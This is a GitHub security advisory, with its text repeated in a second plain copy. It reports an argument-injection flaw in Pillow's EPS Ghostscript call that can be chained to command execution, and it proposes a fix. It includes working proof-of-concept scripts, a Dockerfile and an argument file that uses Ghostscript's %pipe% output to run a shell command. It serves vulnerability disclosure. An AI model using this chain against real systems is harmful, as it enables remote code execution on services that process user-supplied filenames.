---
title: Argument Injection in Ghostscript call, potentially leading into RCE
author: Radarhere
url: https://github.com/python-pillow/Pillow/security/advisories/GHSA-w889-685w-c8fh
hostname: github.com
description: "### Summary `PIL.EpsImagePlugin.Ghostscript()` builds the Ghostscript command line using the input file path (`fp.name`) **without sanitization**, placing it at `-f <infile>`. A filename beginning..."
sitename: GitHub
date: "2026-10-17"
categories: ['repository:5171600']
fingerprint: "54681cd58f71ea8d"
---
    ### Summary

`PIL.EpsImagePlugin.Ghostscript()` builds the Ghostscript command line using the input file path (`fp.name`) **without sanitization**, placing it at `-f <infile>`. A filename beginning with `-` is interpreted by Ghostscript as an option, giving command-line argument injection; chainable to RCE (see Impact). Reproduces with Pillow's default invocation (with `-dSAFER` enabled).

### Details

*Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.*

#### Type

CWE-88 (Argument Injection) (→ CWE-78 (OS Command Injection) optionally, with attacker controlled text file)

#### Vulnerable Codes

```
infile_temp = None
if hasattr(fp, "name") and os.path.exists(fp.name):
    infile = fp.name                      # user-controlled path used as-is, without validation
else:
    in_fd, infile_temp = tempfile.mkstemp()
    os.close(in_fd)
    infile = infile_temp
    # ... (copy fp into a temporary file)
# Build Ghostscript command
command = [
    gs_binary,
    "-q",
    f"-g{width:d}x{height:d}",
    f"-r{res_x:f}x{res_y:f}",
    "-dBATCH",
    "-dNOPAUSE",
    "-dSAFER",                            # default sandbox — does NOT stop this injection
    f"-sDEVICE={device}",
    f"-sOutputFile={outfile}",
    "-c",
    f"{-bbox[0]} {-bbox[1]} translate",
    "-f",
    infile,                               # injected here: inserted into argv with no check for
                                          # option prefixes (-, --) or Ghostscript's @-file token
                                          # => argument injection (CWE-88)
    "-c",
    "showpage",
]
# ...
subprocess.check_call(command, startupinfo=startupinfo)   # spawns Ghostscript
```
#### Root cause.

When rendering an EPS image, PIL.EpsImagePlugin.Ghostscript() constructs the Ghostscript command line using the input file path (fp.name) and places it directly at the -f  position of the argument list. This path is user-controllable, yet Pillow performs no validation or neutralization of tokens that Ghostscript treats specially during command-line argument parsing — in particular a leading - or -- (which Ghostscript interprets as an option rather than a filename) and a leading @ (Ghostscript's argument-file syntax, which causes it to read additional command-line arguments from the named file). Because the filename is neither normalized (e.g., forced to an absolute path or prefixed with ./) nor checked against these prefixes before being handed to the subprocess, an attacker who controls the filename passed to Image.open() can inject arbitrary Ghostscript command-line arguments. This is a classic argument-injection flaw (CWE-88), and it is not mitigated by Pillow's default -dSAFER setting.

#### Affected

- Pillow: tested on 12.3.0 (latest); vulnerable code is long-standing and appears to affect all current versions (main included).
- Component: `src/PIL/EpsImagePlugin.py`, `Ghostscript()` — `infile = fp.name`, and the command list entry `"-f", infile`.

#### Suggested fix

Normalize the filename to an absolute path before it is passed to Ghostscript, so it can never be parsed as an option (`-`/`--`) or as an argument-file token (`@`):

```
    if hasattr(fp, "name") and os.path.exists(fp.name):
        infile = os.path.abspath(fp.name)   # was: infile = fp.name
```
`os.path.abspath()` guarantees the path starts with a path separator (or a drive letter on Windows), so a leading `-` or `@` can no longer reach Ghostscript's argument parser. The `else` branch already builds a safe `tempfile.mkstemp()` path and needs no change.

### PoC

dockerfile, Default run shows the argument-injection demo (poc.py); for the RCE PoC run python3 poc-rce.py.

```
FROM ubuntu:24.04
RUN apt update
RUN apt install -y --no-install-recommends python3 python3-venv ghostscript ca-certificates
RUN rm -rf /var/lib/apt/lists/*
RUN python3 -m venv /venv && /venv/bin/pip install --upgrade pip Pillow==12.3.0
ENV PATH=/venv/bin:$PATH
WORKDIR /poc
COPY poc.py .
COPY poc-rce.py .
COPY arg .
CMD ["python3", "poc.py"]
```

poc.py

```
import os
from PIL import Image
############################################################################################
# Attacker controlled file
############################################################################################
EPS = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\n%%EndComments\nshowpage\n"
name = "-h"
with open(name, "wb") as f:
    f.write(EPS)
############################################################################################
print(f"[*] Pillow opens a file whose name is {name!r}")
im = Image.open(name)
print(f"[*] call `load()`; this paths calls `gs` command with '-f {name}'")
try:
    im.load()
except Exception as e:
    print(f"[*] load() raised: {type(e).__name__}: {e}")
print("CWE-88: argument injection; Pillow code doesn't validate argument name")
print("        This poc.py shows the vulnerability clearly.")
print("        If Pillow checks the name of file before it uses, It won't display `help`")
```

poc-rce.py

```
import os
from PIL import Image
############################################################################################
# Attacker controlled file
############################################################################################
EPS = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\n%%EndComments\nshowpage\n"
# To chain this vulnerability into critical RCE, We need another arbitrary text file
# In this script, it is `arg`.
name = "@arg"
with open(name, "wb") as f:
    f.write(EPS)
############################################################################################
print(f"[*] Pillow opens a file whose name is {name!r}")
im = Image.open(name)
print(f"[*] call `load()`; this paths calls `gs` command with '-f {name}'")
print(f"[*] and this leads to arbitrary command injection.")
print(f"*********************************************")
try:
    im.load()
except Exception as e:
    print(f"*********************************************")
    print(f"[*] load() raised: {type(e).__name__}: {e}")
print("")
print("CWE-78: OS Command Injection;")
print("CWE-88: Argument Injection  ; Pillow code doesn't validate argument name")
print("        This poc.py shows the vulnerability clearly.")
print("        If Pillow checks the name of file before it uses, It won't call `id`")
```

arg

```
-sOutputFile=%pipe%/bin/id
-c
1
dict
dup
/OutputFile
(%pipe%/bin/id)
put
setpagedevice
```

### Impact

**Confirmed — Ghostscript argument injection.** Because the filename is not validated, a leading `-`/`--` is parsed by Ghostscript as an option rather than a file. An attacker who controls the filename passed to `Image.open()` can therefore inject a Ghostscript command-line argument. Single-argument injection always succeeds.

**Potential RCE (verified).** The filename is also not validated against Ghostscript's `@`-file syntax: a filename of the form `@<path>` causes Ghostscript to read additional command-line arguments from `<path>`, allowing multiple arguments to be injected at once. If the attacker can additionally control the referenced file, this can be escalated to arbitrary command execution — an escalation we verified in our PoC (execution of `id`).

Applies under Pillow's default configuration (with `-dSAFER` enabled), on Pillow 12.3.0 with Ghostscript 10.02.1. With same GS arguments, I also confirmed RCE with latest GS version (10.07.1)

### Why this is a Pillow bug (not the documented "block untrusted EPS" risk)

This is not the malicious-EPS-content risk described in Pillow's security policy: the flaw is triggered by the filename, not by anything in the PostScript document. A completely benign EPS file still results in Ghostscript argument injection whenever the filename passed to Image.open() is attacker-influenced, so applications that legitimately process EPS remain affected — the guidance to block untrusted EPS input does not cover this.

Because Pillow is the component that constructs the Ghostscript command line, ensuring a filename cannot be reinterpreted as an option (-/--) or an argument-file token (@) is Pillow's responsibility, not that of every downstream caller. The precondition — attacker influence over a filename that reaches Image.open() — is realistic (e.g., file-upload endpoints that preserve or derive the stored name from user input), and chaining it with this flaw yields RCE in practice, not just in theory. A one-line normalization (os.path.abspath(fp.name)) closes it without any change to how applications use the API.

### Author

Chanu Kang (from CysecLab at KAIST) [@HLe4s](https://github.com/HLe4s)

## Summary

`PIL.EpsImagePlugin.Ghostscript()`builds the Ghostscript command line using the input file path (`fp.name`)without sanitization, placing it at`-f <infile>`. A filename beginning with`-`is interpreted by Ghostscript as an option, giving command-line argument injection; chainable to RCE (see Impact). Reproduces with Pillow's default invocation (with`-dSAFER`enabled).
## Details

Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.
## Type

CWE-88 (Argument Injection) (→ CWE-78 (OS Command Injection) optionally, with attacker controlled text file)

## Vulnerable Codes

## Root cause.

When rendering an EPS image, PIL.EpsImagePlugin.Ghostscript() constructs the Ghostscript command line using the input file path (fp.name) and places it directly at the -f position of the argument list. This path is user-controllable, yet Pillow performs no validation or neutralization of tokens that Ghostscript treats specially during command-line argument parsing — in particular a leading - or -- (which Ghostscript interprets as an option rather than a filename) and a leading @ (Ghostscript's argument-file syntax, which causes it to read additional command-line arguments from the named file). Because the filename is neither normalized (e.g., forced to an absolute path or prefixed with ./) nor checked against these prefixes before being handed to the subprocess, an attacker who controls the filename passed to Image.open() can inject arbitrary Ghostscript command-line arguments. This is a classic argument-injection flaw (CWE-88), and it is not mitigated by Pillow's default -dSAFER setting.

## Affected

`src/PIL/EpsImagePlugin.py`,`Ghostscript()`—`infile = fp.name`, and the command list entry`"-f", infile`.
## Suggested fix

Normalize the filename to an absolute path before it is passed to Ghostscript, so it can never be parsed as an option (

`-`/`--`) or as an argument-file token (`@`):`os.path.abspath()`guarantees the path starts with a path separator (or a drive letter on Windows), so a leading`-`or`@`can no longer reach Ghostscript's argument parser. The`else`branch already builds a safe`tempfile.mkstemp()`path and needs no change.
## PoC

dockerfile, Default run shows the argument-injection demo (poc.py); for the RCE PoC run python3 poc-rce.py.

poc.py

poc-rce.py

arg

## Impact

Confirmed — Ghostscript argument injection.Because the filename is not validated, a leading`-`/`--`is parsed by Ghostscript as an option rather than a file. An attacker who controls the filename passed to`Image.open()`can therefore inject a Ghostscript command-line argument. Single-argument injection always succeeds.Potential RCE (verified).The filename is also not validated against Ghostscript's`@`-file syntax: a filename of the form`@<path>`causes Ghostscript to read additional command-line arguments from`<path>`, allowing multiple arguments to be injected at once. If the attacker can additionally control the referenced file, this can be escalated to arbitrary command execution — an escalation we verified in our PoC (execution of`id`).
Applies under Pillow's default configuration (with

`-dSAFER`enabled), on Pillow 12.3.0 with Ghostscript 10.02.1. With same GS arguments, I also confirmed RCE with latest GS version (10.07.1)
## Why this is a Pillow bug (not the documented "block untrusted EPS" risk)

This is not the malicious-EPS-content risk described in Pillow's security policy: the flaw is triggered by the filename, not by anything in the PostScript document. A completely benign EPS file still results in Ghostscript argument injection whenever the filename passed to Image.open() is attacker-influenced, so applications that legitimately process EPS remain affected — the guidance to block untrusted EPS input does not cover this.

Because Pillow is the component that constructs the Ghostscript command line, ensuring a filename cannot be reinterpreted as an option (-/--) or an argument-file token (@) is Pillow's responsibility, not that of every downstream caller. The precondition — attacker influence over a filename that reaches Image.open() — is realistic (e.g., file-upload endpoints that preserve or derive the stored name from user input), and chaining it with this flaw yields RCE in practice, not just in theory. A one-line normalization (os.path.abspath(fp.name)) closes it without any change to how applications use the API.

## Author

Chanu Kang (from CysecLab at KAIST) @HLe4s
